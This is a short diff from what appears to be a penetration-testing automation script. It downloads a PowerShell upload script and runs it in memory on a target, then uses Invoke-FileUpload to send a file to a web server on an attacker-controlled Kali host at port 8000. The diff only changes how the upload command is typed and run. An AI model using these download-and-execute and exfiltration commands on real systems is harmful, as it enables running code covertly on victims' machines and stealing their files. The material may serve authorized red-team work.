@@ -17,5 +17,5 @@ FILE="PSUpload.ps1"
 
 ps_webclient_upload_file_and_execute_in_memory "${LOCATION}" "${FILE}"
 
-paste_command "Invoke-FileUpload -Uri http://${KALI_IP}:8000/upload -File ${UPLOAD_FILE_LOCATION}"
-xdotool key Return
+execute_command "Invoke-FileUpload -Uri http://${KALI_IP}:8000/upload -File ${UPLOAD_FILE_LOCATION}"
+create_new_line
